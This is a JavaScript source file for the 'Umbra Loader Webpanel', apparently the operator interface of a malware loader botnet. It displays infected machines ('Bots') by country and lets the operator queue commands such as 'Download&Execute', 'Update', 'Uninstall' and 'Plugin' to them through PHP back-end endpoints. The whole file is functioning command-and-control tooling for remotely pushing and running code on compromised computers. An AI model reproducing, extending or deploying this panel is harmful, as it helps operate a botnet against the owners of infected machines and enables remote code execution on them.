/*
        [Name]
        Umbra Loader Webpanel
        
        [Coder]
        Umbr4
        
        [History]
        + First version 
 */

Ext.onReady(function(){
    function renderIcon_country(val) 
    { 
        return '<a <img src="./flags/' + val + '.png" ></a>';
    }
    
    function renderIcon_symbol(val) 
    {
        return '<a <img src="./graphics/' + val + '.png" ></a>';
    }
    
    var store_combobox = new Ext.data.SimpleStore({
        fields: ['cmd'],
        data : [
        ["Download&Execute"],
        ["Update"],
        ["Uninstall"],
        ["Plugin"]]
    }); 

    var store_delete = new Ext.data.Store({
	    proxy: new Ext.data.HttpProxy({url: 'delete_command.php?deleteID=0'}),
	    reader: new Ext.data.JsonReader({
            totalProperty: 'total',
		    root:'results'
        }, [{name: 'a'}, {name: 'b'},{name: 'c'}])
    });	

    var store_countries = new Ext.data.Store(
    {
	    proxy: new Ext.data.HttpProxy(
        {
            url: 'list_countries.php',
        }),
	    reader: new Ext.data.JsonReader(
        {
            totalProperty: 'total',
		    root:'results'
        },
        [{name: '0'}, {name: 'ID'},{name: '1'},{name: 'countryname'},{name: '2'},{name: 'countrycode'},{name: '3'},{name: 'totalbots'},{name:'online'}])
    });	
    
    var store_commands = new Ext.data.Store(
    {
	    proxy: new Ext.data.HttpProxy(
        {
        url: 'list_commands.php',
        }),
	    reader: new Ext.data.JsonReader(
        {
            totalProperty: 'total',
		    root:'results'
        }, 
        [{name: '0'}, {name: 'ID'},{name: '1'},{name: 'command'},{name: '2'},{name: 'parameters'},{name: '3'},{name: 'max'},{name: '4'},{name: 'done'}])
    });	
    
    var lstCountries = new Ext.grid.GridPanel(
    {
        store: store_countries,
        columns: [
            {
                width: 24,
                dataIndex: 'countrycode',
                renderer: renderIcon_country              
            },
            {
                header   : 'Country', 
                width    : 120, 
                sortable : true,
                dataIndex: 'countryname'
            },
            {
                header   : 'Online', 
                width    : 75, 
                sortable : true, 
                renderer: function(v, m, rec) 
                {
                    return rec.get('online') + ' Bot(s)';
                }
            },
            {
                header   : 'Total', 
                width    : 75, 
                sortable : true, 
                renderer: function(v, m, rec) 
                {
                    return rec.get('totalbots') + ' Bot(s)';
                }
            }],
        stripeRows: true
    });
            
    var lstCommands = new Ext.grid.GridPanel(
    {
        store: store_commands,
        columns: [
             {
                width: 24,
                renderer: renderIcon_symbol, 
                dataIndex: 'command'                
            },
            {
                header   : 'ID', 
                width: 24,
                dataIndex: 'ID'                
            }
            ,
            {
                
                header   : 'Command', 
                width    : 160, 
                sortable : true, 
                dataIndex: 'command'
            },
            {
                id       :'id_param',
                header   : 'Parameter', 
                width    : 160, 
                sortable : true, 
                dataIndex: 'parameters'
            },
            {
                header   : 'Executed', 
                width    : 75, 
                sortable : true, 
                dataIndex: 'done'
            },
            {
                xtype: 'actioncolumn',
                width: 24,
                items: [
                {
                    icon   : './graphics/cross-button.png',
                    handler: function(grid, rowIndex, colIndex) 
                    {
                        var rec = store_commands.getAt(rowIndex);
                        store_delete.proxy= new Ext.data.HttpProxy({url: 'delete_command.php?deleteID=' + rec.get('ID')});
                        store_delete.load();
                        store_commands.load();
                    }
                }               
                ]
                }],
        stripeRows: true,
        autoExpandColumn: 'id_param'
    });
    
    var pan_commands = new Ext.Panel(
    {
        id:'imgcommands',
        collapsible:false,
        layout:'fit',
        title:'Commands',
        tbar: new Ext.Toolbar({
            enableOverflow: true,
            items: [{
                text: 'Refresh',
                iconCls: 'refreshicon',
                handler:function()
                {
                    store_commands.load();
                }
            }]
        }),
        items: lstCommands
    });
    
    var pan_countries = new Ext.Panel(
    {
        id:'imgcountries',
        collapsible:false,
        layout:'fit',
        title:'Country Statistics',
        tbar: new Ext.Toolbar({
            enableOverflow: true,
            items: [{
                text: 'Refresh',
                iconCls: 'refreshicon',
                handler:function()
                {
                    store_countries.load();
                }
            }]
        }),
        items: lstCountries
    });
    
    var pan_login = new Ext.FormPanel(
    { 
        frame:true, 
        title:'Add Command', 
        monitorValid:true,
        url:'add_command.php', 
        items:[
        { 
                    xtype: 'combo',
                    fieldLabel: 'Command',
                    store:store_combobox,
                    displayField: 'cmd',
                    name: 'addCommand',
                    allowBlank:false,
                    typeAhead: true,
                    editable: false,
                    triggerAction: 'all',
                    mode: 'local',
                    anchor: '100%'                    
        },
        { 
                    xtype: 'textfield',
                    fieldLabel:'Parameters', 
                    name:'addParameters', 
                    anchor: '100%' ,
                    allowBlank:false
        }], 
         buttons:[
         { 
            text:'Add',
            formBind: true,
            handler:function()
            { 
                    pan_login.getForm().submit({ 
                        method:'POST', 
                        waitTitle:'Connecting', 
                        waitMsg:'Sending data...',
                        success:function()
                        { 
                            store_commands.load();
                        } 
                    }); 
         } 
     }]
    }); 
   
    var win_login = new Ext.Window(
    {
        layout:'fit',
        width:300,
        height:140,
        x:317,
        y:412,
        closable: false,
        resizable: false,
        plain: true,
        border: false,
        items: [pan_login]
	});
    
    var win_commands = new Ext.Window(
    {
        layout:'fit',
        width:600,
        height:300,
        x:317,
        y:110,
        closable: false,
        resizable: true,
        plain: true,
        border: false,
        items: [pan_commands]
	});
	
    var win_countries = new Ext.Window(
    {
        layout:'fit',
        width:315,
        height:550,
        x:0,
        y:0,
        closable: false,
        resizable: true,
        plain: true,
        border: false,
        items: [pan_countries]
	});
    
    store_commands.load();
    store_countries.load();
    
    win_login.show();
    win_commands.show();
	win_countries.show();
    
});